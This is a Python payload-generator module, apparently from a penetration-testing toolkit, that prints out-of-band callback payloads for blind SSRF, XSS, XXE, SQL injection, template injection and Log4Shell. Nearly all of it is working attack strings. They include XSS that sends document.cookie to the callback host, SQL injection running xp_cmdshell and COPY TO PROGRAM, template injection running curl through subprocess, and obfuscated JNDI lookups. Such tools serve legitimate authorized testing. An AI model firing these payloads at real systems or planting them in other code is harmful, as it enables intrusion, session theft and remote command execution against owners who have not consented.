#!/usr/bin/python3
"""
Collaborator Everywhere — OOB (out-of-band) payload generator.

Generates payloads for detecting blind SSRF, blind XSS, blind SQLi, XXE,
and SSTI via an out-of-band callback. Works with:
  - Burp Collaborator (your.burpcollaborator.net)
  - interactsh / webhook.site / requestbin
  - Any domain you control with DNS logging

Usage:
  ../.venv/bin/python3 modules/collaborator.py --domain oast.me
  ../.venv/bin/python3 modules/collaborator.py --domain your.burpcollaborator.net --all
  ../.venv/bin/python3 modules/collaborator.py --domain x.oast.me --type ssrf
"""
import argparse
import random
import string
import uuid

from core.colors import bold, underline, end, green, yellow, info, tab


def _uid(domain: str) -> str:
    """Generate a unique per-payload subdomain so you can correlate hits."""
    prefix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}.{domain}"


def ssrf_payloads(domain: str) -> dict[str, list[str]]:
    cb = _uid(domain)
    return {
        "URL parameters / query strings": [
            f"https://{cb}",
            f"http://{cb}",
            f"//{cb}",
        ],
        "SSRF via redirect": [
            f"https://{cb}/redirect",
        ],
        "Headers to inject": [
            f"X-Forwarded-For: {cb}",
            f"X-Forwarded-Host: {cb}",
            f"X-Original-URL: http://{cb}",
            f"Referer: http://{cb}",
            f"True-Client-IP: {cb}",
            f"Host: {cb}",
        ],
    }


def xss_payloads(domain: str) -> dict[str, list[str]]:
    cb  = _uid(domain)
    img = f"<img src='http://{cb}/x' onerror='fetch(\"http://{cb}/xss\"+document.cookie)'>"
    return {
        "Blind XSS payloads": [
            f'"><script src="http://{cb}/x.js"></script>',
            img,
            f"javascript:fetch('http://{cb}/'+document.cookie)",
            f'<svg onload="new Image().src=\'http://{cb}/\'+document.domain">',
            f'<iframe src="http://{cb}/"></iframe>',
        ],
        "XSS via headers (reflected in error pages)": [
            f"User-Agent: <script src='http://{cb}/ua.js'></script>",
            f"Referer: http://{cb}",
        ],
    }


def xxe_payloads(domain: str) -> dict[str, list[str]]:
    cb = _uid(domain)
    return {
        "XXE — out-of-band": [
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{cb}/xxe"> ]><foo>&xxe;</foo>',
            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{cb}/xxe.dtd"> %xxe; ]>',
        ],
        "XXE — blind (parameter entity)": [
            f'<!DOCTYPE r [<!ENTITY % p SYSTEM "http://{cb}/p.dtd">%p;]>',
        ],
    }


def sqli_oob_payloads(domain: str) -> dict[str, list[str]]:
    cb = _uid(domain)
    return {
        "MySQL DNS OOB": [
            f"1 AND LOAD_FILE(CONCAT('\\\\\\\\',({cb}),'\\\\x'))",
            f"1 UNION SELECT LOAD_FILE(0x2f2f{cb.encode().hex()}2f)",
        ],
        "MSSQL DNS OOB": [
            f"'; exec master..xp_dirtree '//{cb}/x'--",
            f"1; exec xp_cmdshell 'nslookup {cb}'--",
        ],
        "Oracle DNS OOB": [
            f"' UNION SELECT UTL_HTTP.REQUEST('http://{cb}') FROM dual--",
            f"' AND (SELECT * FROM (SELECT UTL_HTTP.REQUEST('http://{cb}')) t)--",
        ],
        "PostgreSQL OOB": [
            f"' ; COPY (SELECT '') TO PROGRAM 'nslookup {cb}'--",
        ],
    }


def ssti_oob_payloads(domain: str) -> dict[str, list[str]]:
    cb = _uid(domain)
    return {
        "Jinja2 / Python SSTI": [
            f"{{% for x in ().__class__.__base__.__subclasses__() %}}{{%if 'subprocess' in x.__name__%}}{{{{x('curl http://{cb}/',shell=True,stdout=-1).communicate()}}}}{{% endif %}}{{% endfor %}}",
        ],
        "Freemarker SSTI": [
            f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("curl http://{cb}/ ")}}',
        ],
        "ERB / Ruby SSTI": [
            f'<%= `curl http://{cb}/` %>',
        ],
        "Twig SSTI": [
            f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('curl http://{cb}/')}}}}",
        ],
    }


def log4shell_payloads(domain: str) -> dict[str, list[str]]:
    cb = _uid(domain)
    return {
        "Log4Shell (CVE-2021-44228)": [
            f"${{jndi:ldap://{cb}/a}}",
            f"${{jndi:dns://{cb}/a}}",
            f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{cb}/a}}",
            f"${{j${{k}}ndi:ldap://{cb}/a}}",
        ],
        "Inject these headers": [
            f"User-Agent: ${{jndi:ldap://{cb}/a}}",
            f"X-Forwarded-For: ${{jndi:ldap://{cb}/a}}",
            f"Referer: ${{jndi:ldap://{cb}/a}}",
        ],
    }


ALL_GENERATORS = {
    "ssrf":     ("SSRF",       ssrf_payloads),
    "xss":      ("Blind XSS",  xss_payloads),
    "xxe":      ("XXE",        xxe_payloads),
    "sqli":     ("SQLi OOB",   sqli_oob_payloads),
    "ssti":     ("SSTI",       ssti_oob_payloads),
    "log4shell":("Log4Shell",  log4shell_payloads),
}


def generate(domain: str, types: list[str]) -> None:
    print(f"\n{bold}OOB Callback domain: {green}{domain}{end}\n")
    print(f"{info} Each section uses a unique subdomain — monitor DNS/HTTP hits at your callback server.\n")

    for key in types:
        fn_name, fn = ALL_GENERATORS[key]
        groups = fn(domain)
        print(f"{bold}{underline}{fn_name} payloads{end}")
        for group, payloads in groups.items():
            print(f"\n{tab}{green}{group}{end}")
            for p in payloads:
                print(f"  {tab}{p}")
        print()


def main():
    parser = argparse.ArgumentParser(description="Generate OOB payloads for blind SSRF, XSS, XXE, SQLi, SSTI, Log4Shell")
    parser.add_argument("--domain", required=True, help="Your OOB callback domain (e.g. xyz.oast.me)")
    parser.add_argument("--type",   dest="types", action="append",
                        choices=list(ALL_GENERATORS.keys()),
                        help="Payload type (can repeat). Default: ssrf xss xxe")
    parser.add_argument("--all",    action="store_true", help="Generate all payload types")
    args = parser.parse_args()

    types = list(ALL_GENERATORS.keys()) if args.all else (args.types or ["ssrf", "xss", "xxe"])
    generate(args.domain, types)


if __name__ == "__main__":
    main()
